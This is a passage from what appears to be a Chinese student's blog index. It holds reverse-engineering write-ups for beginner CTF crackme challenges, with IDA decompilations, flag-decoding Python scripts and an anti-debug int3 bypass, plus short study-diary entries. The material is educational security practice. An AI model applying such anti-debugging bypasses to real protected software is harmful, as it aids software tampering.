class="string">'e'</span></span><br><span class="line"><span class="symbol">.data:</span>00000000006010A0                                         <span class="comment">; DATA XREF: main+3F↑r</span></span><br><span class="line"><span class="symbol">.data:</span>00000000006010A0                 <span class="built_in">db</span> <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'b'</span>, <span class="string">'7'</span>, <span class="string">'b'</span>, <span class="string">'d'</span>, <span class="string">'c'</span>, <span class="string">'e'</span>, <span class="string">'3'</span>, <span class="string">'c'</span>, <span class="string">'6'</span></span><br><span class="line"><span class="symbol">.data:</span>00000000006010A0                 <span class="built_in">db</span> <span class="string">'8'</span>, <span class="string">'2'</span>, <span class="string">'0'</span>, <span class="string">'3'</span>, <span class="string">'1'</span>, <span class="string">'4'</span>, <span class="string">'b'</span>, <span class="string">'7'</span>, <span class="string">'4'</span>, <span class="string">'9'</span>, <span class="string">'8'</span></span><br><span class="line"><span class="symbol">.data:</span>00000000006010A0                 <span class="built_in">db</span> <span class="number">0</span></span><br><span class="line"><span class="symbol">.data:</span>00000000006010C1                 <span class="meta">align</span> <span class="number">20h</span></span><br></pre></td></tr></table></figure></p><p>t在内存中为：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.data:</span>00000000006010E0 t               <span class="built_in">db</span> <span class="number">53h</span>                  <span class="comment">; DATA XREF: main+65↑w</span></span><br><span class="line"><span class="symbol">.data:</span>00000000006010E0                                         <span class="comment">; main+C9↑o ...</span></span><br><span class="line"><span class="symbol">.data:</span>00000000006010E1 aHarifctf       <span class="built_in">db</span> <span class="string">'harifCTF&#123;????????????????????????????????&#125;'</span>,<span class="number">0</span></span><br><span class="line"><span class="symbol">.data:</span>000000000060110C                 <span class="meta">align</span> <span class="number">20h</span></span><br></pre></td></tr></table></figure></p><p>很明显<code>*(&amp;t + (signed int)v5 + 10) = s[(signed int)v5] + v3</code>就是把s中的内容处理一下，放到t中的’?’位置处。</p><p>内容处理的方法也非常容易实现：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'c61b68366edeb7bdce3c6820314b7498'</span></span><br><span class="line">ss = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">    <span class="keyword">if</span> i &amp; <span class="number">1</span> :</span><br><span class="line">        v = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        v = <span class="number">-1</span></span><br><span class="line">    x = ord(s[i]) + v</span><br><span class="line">    ss += chr(x)</span><br><span class="line">print(<span class="string">'harifCTF&#123;'</span>+ss+<span class="string">'&#125;'</span>)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 玩安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NJUPT CTF 2017 python-trade</title>
      <link href="/2019/04/29/NJUPT-CTF-2017-python-trade/"/>
      <url>/2019/04/29/NJUPT-CTF-2017-python-trade/</url>
      
        <content type="html"><![CDATA[<p><a href="Py.pyc">题目下载</a></p><p>这道是个python的题，这里我用了uncompyle6进行反编译处理，反编译结果如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.2.5</span></span><br><span class="line"><span class="comment"># Python bytecode 2.7 (62211)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.7.2 (tags/v3.7.2:9a3ffc0492, Dec 23 2018, 22:20:52) [MSC v.1916 32 bit (Intel)]</span></span><br><span class="line"><span class="comment"># Embedded file name: 1.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2017-06-03 10:20:43</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(message)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">        x = ord(i) ^ <span class="number">32</span></span><br><span class="line">        x = x + <span class="number">16</span></span><br><span class="line">        s += chr(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">correct = <span class="string">'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Input flag:'</span></span><br><span class="line">flag = raw_input()</span><br><span class="line"><span class="keyword">if</span> encode(flag) == correct:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'correct'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'wrong'</span></span><br><span class="line"><span class="comment"># okay decompiling Py.pyc</span></span><br></pre></td></tr></table></figure><p>阅读代码，可以看出correct就是我们要解密的内容。根据encode内容，写出对应的decode过程即可。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(message)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">        x = ord(i) ^ <span class="number">32</span></span><br><span class="line">        x = x + <span class="number">16</span></span><br><span class="line">        s += chr(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(s)</span><br><span class="line"></span><br><span class="line">correct = <span class="string">'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'</span></span><br><span class="line">ss = <span class="string">''</span></span><br><span class="line">cor = base64.b64decode(correct)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cor:</span><br><span class="line">    y = int(i) - <span class="number">16</span></span><br><span class="line">    y ^= <span class="number">32</span></span><br><span class="line">    ss += chr(y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (ss)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 玩安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAW CTF 2014 csaw2013reversing2</title>
      <link href="/2019/04/29/CSAW-CTF-2014-csaw2013reversing2/"/>
      <url>/2019/04/29/CSAW-CTF-2014-csaw2013reversing2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>hint: 听说运行就能拿到Flag，不过菜鸡运行的结果不知道为什么是乱码</p></blockquote><p><a href="csaw2013reversing2.exe">题目下载</a></p><p>拿到题目，运行一下是这样的：</p><p><img src="/2019/04/29/CSAW-CTF-2014-csaw2013reversing2/1.png" alt="首次运行"></p><p>用IDA查看一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  CHAR *lpMem; <span class="comment">// [esp+8h] [ebp-Ch]</span></span><br><span class="line">  HANDLE hHeap; <span class="comment">// [esp+10h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  hHeap = HeapCreate(<span class="number">0x40000</span>u, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  lpMem = (CHAR *)HeapAlloc(hHeap, <span class="number">8u</span>, MaxCount + <span class="number">1</span>);</span><br><span class="line">  memcpy_s(lpMem, MaxCount, &amp;unk_409B10, MaxCount);</span><br><span class="line">  <span class="keyword">if</span> ( sub_40102A() || IsDebuggerPresent() )</span><br><span class="line">  &#123;</span><br><span class="line">    __debugbreak();</span><br><span class="line">    sub_401000(v3 + <span class="number">4</span>, (<span class="keyword">int</span>)lpMem);</span><br><span class="line">    ExitProcess(<span class="number">0xFFFFFFFF</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  MessageBoxA(<span class="number">0</span>, lpMem + <span class="number">1</span>, <span class="string">"Flag"</span>, <span class="number">2u</span>);</span><br><span class="line">  HeapFree(hHeap, <span class="number">0</span>, lpMem);</span><br><span class="line">  HeapDestroy(hHeap);</span><br><span class="line">  ExitProcess(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看完之后大概可以得出，unk_409B10是加密后的flag，if判断中有IsDebuggerPresent()，需要在调试环境下才会执行到<code>sub_401000(v3 + 4, (int)lpMem)</code>这个解密步骤。但是执行解密函数前又有一个<code>int3</code>指令，该指令起到反调试的作用（具体原理待补充）。所以需要跳过这个指令。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">loc_401096:</span></span><br><span class="line"><span class="keyword">inc</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="keyword">inc</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="keyword">inc</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="keyword">inc</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="keyword">int</span>     <span class="number">3</span>               <span class="comment">; Trap to Debugger</span></span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span>+lpMem]</span><br><span class="line"><span class="keyword">call</span>    sub_401000</span><br><span class="line"><span class="keyword">jmp</span>     short loc_4010EF</span><br></pre></td></tr></table></figure><p>之前我试图用python实现解密算法，手动解密一下flag，结果因为数据类型的原因又把自己绕懵了，暂时没有写。于是我用x32dbg动态跑了一下，通过改jmp条件、nop掉INT3，执行到解密函数得到flag。</p><p>这个题应该可以写IDC脚本，在IDA下控制参数、手动执行解密函数得到答案，这个也待补充。</p>]]></content>
      
      
      <categories>
          
          <category> 玩安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
            <tag> 待补充 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20190428</title>
      <link href="/2019/04/29/20190428/"/>
      <url>/2019/04/29/20190428/</url>
      
        <content type="html"><![CDATA[<p>（写于20190429，补）</p><p>肝了一天的write up，把最初做过的水题又做了一遍，居然感觉稍微加深了一些理解，果然还是太菜了……</p><p>研究了面向对象课的课设，小组进展极其缓慢……用例描述还没有写，希望可以顺利肝完吧。</p><p>CSAPP就要到了，现在准备把这本书和自我修养在放假前过一遍。</p><p>五一前把攻防世界RE的新手区WP肝完。</p><p>现在还没想好什么时候开始搞移动逆向，感觉该开始了，但是又觉得没什么精力。</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 乱七八糟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20190429</title>
      <link href="/2019/04/29/20190429/"/>
      <url>/2019/04/29/20190429/</url>
      
        <content type="html"><![CDATA[<p>今天终于把攻防世界RE新手场的题解写完了，撒花~</p><p>进阶场有116题，慢慢做，希望技术可以有所提升。</p><p>感觉这些题重新做一遍有了一些新收获，写成博客还会有一些新收获，希望可以形成良性循环吧，也希望自己可以坚持学下去。</p><p>正式开始看CSAPP了，从第二章开始，尽量记读书笔记、做课后练习题，暂时先搁置homework，时间不太够。</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 乱七八糟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>9447 CTF 2014 no_strings_attached</title>
      <link href="/2019/04/28/9447-CTF-2014-no-strings-attached/"/>
      <url>/2019/04/28/9447-CTF-2014-no-strings-attached/</url>
      
        <content type="html"><![CDATA[<p><a href="no_strings_attached">题目点我</a></p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>先用IDA看，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setlocale(<span class="number">6</span>, &amp;locale);</span><br><span class="line">  banner();</span><br><span class="line">  prompt_authentication();</span><br><span class="line">  authenticate();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>挨个看一遍，发现<code>authenticate()</code>里面有个<code>decrypt()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">authenticate</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> ws[<span class="number">8192</span>]; <span class="comment">// [esp+1Ch] [ebp-800Ch]</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *s2; <span class="comment">// [esp+801Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  s2 = decrypt(&amp;s, &amp;dword_8048A90);</span><br><span class="line">  <span class="keyword">if</span> ( fgetws(ws, <span class="number">0x2000</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    ws[wcslen(ws) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !wcscmp(ws, s2) )</span><br><span class="line">      wprintf(&amp;unk_8048B44);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      wprintf(&amp;unk_8048BA4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(s2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现<code>authenticate()</code>里面有打印成功或失败提示的操作，由此判断s就是需要解密的字符串，这里应该可以动态调试，执行到这步直接看内存（<strong>待补充</strong>）获得解密后的flag。这里先试图用静态分析+脚本解一下。</p><p>跟进<code>decrypt()</code>，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">wchar_t</span> *__<span class="function">cdecl <span class="title">decrypt</span><span class="params">(<span class="keyword">wchar_t</span> *s, <span class="keyword">wchar_t</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+20h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+24h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v7; <span class="comment">// [esp+28h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *dest; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = wcslen(s);</span><br><span class="line">  v7 = wcslen(a2);</span><br><span class="line">  v2 = wcslen(s);</span><br><span class="line">  dest = (<span class="keyword">wchar_t</span> *)<span class="built_in">malloc</span>(v2 + <span class="number">1</span>);</span><br><span class="line">  wcscpy(dest, s);</span><br><span class="line">  <span class="keyword">while</span> ( v4 &lt; v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v7 &amp;&amp; v4 &lt; v6; ++i )</span><br><span class="line">      dest[v4++] -= a2[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据内容试图写小脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">0x143A</span>,<span class="number">0x1436</span>,<span class="number">0x1437</span>,<span class="number">0x143B</span>,<span class="number">0x1480</span>,<span class="number">0x147A</span>,<span class="number">0x1471</span>,<span class="number">0x1478</span>,<span class="number">0x1463</span>,<span class="number">0x1466</span>,<span class="number">0x1473</span>,<span class="number">0x1467</span>,<span class="number">0x1462</span>,<span class="number">0x1465</span>,<span class="number">0x1473</span>,<span class="number">0x1460</span>,<span class="number">0x146B</span>,<span class="number">0x1471</span>,<span class="number">0x1478</span>,<span class="number">0x146A</span>,<span class="number">0x1473</span>,<span class="number">0x1470</span>,<span class="number">0x1464</span>,<span class="number">0x1478</span>,<span class="number">0x146E</span>,<span class="number">0x1470</span>,<span class="number">0x1470</span>,<span class="number">0x1464</span>,<span class="number">0x1470</span>,<span class="number">0x1464</span>,<span class="number">0x146E</span>,<span class="number">0x147B</span>,<span class="number">0x1476</span>,<span class="number">0x1478</span>,<span class="number">0x146A</span>,<span class="number">0x1473</span>,<span class="number">0x147B</span>,<span class="number">0x1480</span>]</span><br><span class="line">a = [<span class="number">0x1401</span>,<span class="number">0x1402</span>,<span class="number">0x1403</span>,<span class="number">0x1404</span>,<span class="number">0x1405</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">    print(chr(s[i] - a[i % len(a)]),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>（待补充）</p>]]></content>
      
      
      <categories>
          
          <category> 玩安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
            <tag> 待补充 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RC3 CTF 2016 logmein</title>
      <link href="/2019/04/28/RC3-CTF-2016-logmein/"/>
      <url>/2019/04/28/RC3-CTF-2016-logmein/</url>
      
        <content type="html"><![CDATA[<p><a href="logmein">又是一道Linux逆向</a>，还是先放IDA了。</p><p>重命名了两个函数，方便理解。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+3Ch] [rbp-54h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">36</span>]; <span class="comment">// [rsp+40h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+64h] [rbp-2Ch]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+68h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v8[<span class="number">8</span>]; <span class="comment">// [rsp+70h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+8Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v8, <span class="string">":\"AL_RT^L*.?+6/46"</span>);</span><br><span class="line">  v7 = <span class="number">28537194573619560L</span>L;  <span class="comment">// 'ebmarah'</span></span><br><span class="line">  v6 = <span class="number">7</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Welcome to the RC3 secure password guesser.\n"</span>, a2, a3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"To continue, you must enter the correct password.\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter your guess: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%32s"</span>, s);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="built_in">strlen</span>(v8) )</span><br><span class="line">    wrong(v8);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="built_in">strlen</span>(v8) )</span><br><span class="line">      ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))wrong)();</span><br><span class="line">    <span class="keyword">if</span> ( s[i] != (<span class="keyword">char</span>)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]) )</span><br><span class="line">      ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))wrong)();</span><br><span class="line">  &#125;</span><br><span class="line">  correct();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出来v8就是加密后的flag，下方的循环利用v6、v7，与用户输入一起计算，再与v8对比，主要考察的应该是逆向算法了。有一点需要注意，v7是按小端序存储的，因此在IDA中转换为字符（因为v7是按字节取的）之后需要颠倒一下顺序。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">':\"AL_RT^L*.?+6/46'</span></span><br><span class="line">b = <span class="string">'harambe'</span></span><br><span class="line">key = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">    m = ord(a[i]) ^ ord(b[i % <span class="number">7</span>])</span><br><span class="line">    key += chr(m)</span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 玩安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>9447 CTF 2014 insanity</title>
      <link href="/2019/04/28/9447-CTF-2014-insanity/"/>
      <url>/2019/04/28/9447-CTF-2014-insanity/</url>
      
        <content type="html"><![CDATA[<p><a href="insanity">一道假的题</a>，运行随机暂停一段时间，之后打印flag……</p><p>这道题太简单，按理说不应该单发的，但是有点小强迫症，要把攻防世界逆向的每道题都单发出来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Reticulating splines, please wait.."</span>);</span><br><span class="line">  sleep(<span class="number">5u</span>);</span><br><span class="line">  v3 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  v4 = rand();</span><br><span class="line">  <span class="built_in">puts</span>((&amp;strs)[v4 % <span class="number">0xA</span>]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><del>双击666</del>双击&amp;strs直接出。<del>或者运行随缘出。</del></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">./insanity</span><br><span class="line">Reticulating splines, please wait..</span><br><span class="line">9447&#123;This_is_a_flag&#125;</span><br><span class="line"> ./insanity</span><br><span class="line">Reticulating splines, please wait..</span><br><span class="line">Have you considered becoming a vacuum cleaner? You&apos;re pretty good at sucking.</span><br><span class="line"> ./insanity</span><br><span class="line">Reticulating splines, please wait..</span><br><span class="line">I&apos;ve got a good feeling about this one..... wait no. Maybe next time.</span><br><span class="line"> ./insanity</span><br><span class="line">Reticulating splines, please wait..</span><br><span class="line">Have you considered becoming a vacuum cleaner? You&apos;re pretty good at sucking.</span><br><span class="line"> ./insanity</span><br><span class="line">Reticulating splines, please wait..</span><br><span class="line">Congrats, you hacked me!</span><br><span class="line">$ </span><br><span class="line"> ./insanity</span><br><span class="line">Reticulating splines, please wait..</span><br><span class="line">#define YOU &quot;massive failure&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 玩安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>simple-unpack</title>
      <link href="/2019/04/28/simple-unpack/"/>
      <url>/2019/04/28/simple-unpack/</url>
      
